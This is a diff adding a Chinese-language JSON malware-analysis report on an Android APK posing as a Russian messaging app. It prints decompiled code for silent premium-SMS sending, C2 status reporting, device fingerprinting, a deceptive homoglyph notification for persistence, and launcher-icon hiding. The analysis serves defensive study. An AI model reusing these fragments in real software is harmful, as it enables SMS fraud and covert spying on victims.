@@ -1,0 +1,174 @@
+{
+  "APK信息": {
+    "文件名": "8c1b1be2373c2f823ba9a3a3a91b6575d62f6c50f5e192c5f9102685955326ef.apk",
+    "sha256": "8c1b1be2373c2f823ba9a3a3a91b6575d62f6c50f5e192c5f9102685955326ef",
+    "包名": "com.god.gaspedal",
+    "应用名": "Посланиe",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 201.4
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\god\\gaspedal\\Deadly;",
+          "method_signature": "a(Context context, Intent intent)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "new c(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class Deadly extends BroadcastReceiver {\n      private void a(Context context, Intent intent) {\n>>>         new c(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();\n      }\n  \n      private Object[] a(Bundle bundle) {",
+          "behavior_description": "该代码位于伪装成短信应用的恶意样本的 BroadcastReceiver（Deadly）中。在短信发送/送达结果广播回调里，代码将命令ID（id）、命令编号（command）、是否POST（post）以及短信发送结果码（getResultCode()）作为参数，通过类c（网络请求封装类，模式3）链式构造并以 a() 触发上报，将命令执行状态回传给远程C2服务器。数据流向：广播Intent中的命令参数与短信发送结果码（source）→ 网络请求上报至C2服务器（sink）。结合该类中同时存在的 PDU 短信解析逻辑（bundle.get(\"pdus\")、displayOriginatingAddress），可判定这是短信欺诈/远程控制木马向C2回传命令执行结果（如短信是否发送成功）的C2通信通道，属于明确的恶意行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\god\\gaspedal\\d;",
+          "method_signature": "a(Context context, String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n    try {\n        Era.a(true);\n        SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n    } catch (Exception e) {\n        b.a(context, e, str, str2);\n    }\n}",
+          "malicious_code_snippet_context": "          d(context).setRepeating(0, j, 60000L, PendingIntent.getBroadcast(context, 0, new Intent(context, (Class<?>) Xray.class), 134217728));\n      }\n  \n>>>     public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n>>>         try {\n>>>             Era.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n>>>         } catch (Exception e) {\n>>>             b.a(context, e, str, str2);\n>>>         }\n>>>     }\n  \n      public static void a(Context context, boolean z) {\n          int i = Build.VERSION.SDK_INT >= 19 ? 132 : 4;",
+          "behavior_description": "该方法封装了静默短信发送功能：接收目标号码(str)、短信内容(str2)和发送状态回调 PendingIntent，直接调用 SmsManager.getDefault().sendTextMessage() 在无任何用户界面和用户知情的情况下发送短信。数据流向为：外部传入的目标号码和短信内容（通常来自 C2 指令或硬编码的增值服务号码）→ sendTextMessage() 静默发送。结合同类中 setRepeating 定时任务（周期性触发 Xray 广播），可实现定时批量静默发送短信，是典型的增值短信扣费欺诈（premium SMS fraud）模式。异常时还会将号码和内容上报给 b.a() 进行记录/重试，进一步表明这是有组织的短信欺诈流程而非正常业务。该样本已被厂商确认为伪装成'短信'应用、滥用 AccessibilityService 的恶意软件，此静默发短信行为与其欺诈目的吻合。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\god\\gaspedal\\d;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String c(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          return false;\n      }\n  \n>>>     public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  \n      private static void c(Context context, long j) {\n          if (j - a > 9528) {",
+          "behavior_description": "该方法通过 Settings.Secure.getString 从系统 ContentResolver 中读取 ANDROID_ID（设备级唯一标识符），用于对感染设备进行指纹标识。数据流向：系统 Settings.Secure 设置项（android_id）→ 读取后作为返回值提供给调用方，用于构建设备指纹、唯一标识和追踪受害设备。该代码位于恶意程序自有包 com.god.gaspedal 中（非第三方库），结合厂商报告确认该样本为滥用 AccessibilityService 的间谍软件，此设备标识符采集属于其受害者追踪与隐私窃取链条的组成部分；同类的伴生代码还包含基于时间间隔（9528ms）拉起 SpeedWall 隐蔽界面的逻辑。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\god\\gaspedal\\Formula;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    this.a.createNotificationChannel(new NotificationChannel(\"com.god.gaspedal.STANDARD\", \"Cousin\", 1));\n    builder = new Notification.Builder(getApplicationContext(), \"com.god.gaspedal.STANDARD\");\n} else {\n    builder = new Notification.Builder(getApplicationContext());\n}\nbuilder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Oсновной прoцесс\").setContentText(\"Cиcтема не коррeктнo работaeт, вaм нeобходимо включить дocтуп к стaтиcтикe для 'Oсновной прoцесс'\");\nstartForeground(36, builder.build());",
+          "malicious_code_snippet_context": "  \n      private void a() {\n          Notification.Builder builder;\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             this.a.createNotificationChannel(new NotificationChannel(\"com.god.gaspedal.STANDARD\", \"Cousin\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"com.god.gaspedal.STANDARD\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n>>>         }\n>>>         builder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Oсновной прoцесс\").setContentText(\"Cиcтема не коррeктнo работaeт, вaм нeобходимо включить дocтуп к стaтиcтикe для 'Oсновной прoцесс'\").setWhen(System.currentTimeMillis());\n>>>         startForeground(36, builder.build());\n      }\n  \n      private void b() {",
+          "behavior_description": "该代码位于已确认恶意样本（伪装为'Сообщения/短信'的间谍木马，滥用AccessibilityService）的服务组件中。数据流向：读取 Build.VERSION.SDK_INT 判断系统版本 → 创建通知渠道并构造通知 → 调用 startForeground(36, builder.build()) 将服务提升为前台服务实现进程保活，防止系统回收恶意服务。通知内容为伪装成系统错误的俄语欺骗性提示（'系统运行不正常，需要为主进程开启统计信息访问权限'），且文本中混用拉丁字母与西里尔同形字（如'Oсновной прoцесс'中的拉丁O/o）进行混淆以规避检测，属于社会工程学诱导用户授权的手段，为木马的隐蔽驻留和后续间谍行为提供持久化支撑。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\god\\gaspedal\\EmbryoExpression;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "private void a() {\n    getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) EmbryoExpression.class), 2, 1);\n}\n\nprotected void onCreate(Bundle bundle) {\n    super.onCreate(bundle);\n    a();\n    finish();\n}",
+          "malicious_code_snippet_context": "  \n  /* JADX INFO: loaded from: classes.dex */\n  public class EmbryoExpression extends Activity {\n>>>     private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) EmbryoExpression.class), 2, 1);\n>>>     }\n>>> \n>>>     @Override // android.app.Activity\n>>>     protected void onCreate(Bundle bundle) {\n>>>         super.onCreate(bundle);\n>>>         a();\n>>>         finish();\n      }\n  }",
+          "behavior_description": "该Activity在onCreate()启动时立即调用a()，通过getPackageManager().setComponentEnabledSetting()将自身组件（应用启动入口EmbryoExpression）设置为禁用状态（参数2即COMPONENT_ENABLED_STATE_DISABLED），随后调用finish()关闭界面。数据流向：getApplicationContext()获取应用上下文→构造指向自身启动器组件的ComponentName→setComponentEnabledSetting()禁用该组件，使应用图标从桌面启动器中消失，用户无法察觉应用存在也难以卸载。这与厂商报告中该样本伪装成'Сообщениe（信息）'应用、滥用AccessibilityService后隐藏自身以监控受害者的行为完全吻合，是典型的恶意图标隐藏/自我隐藏技术，为后续隐蔽窃取和监控提供持久驻留条件。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
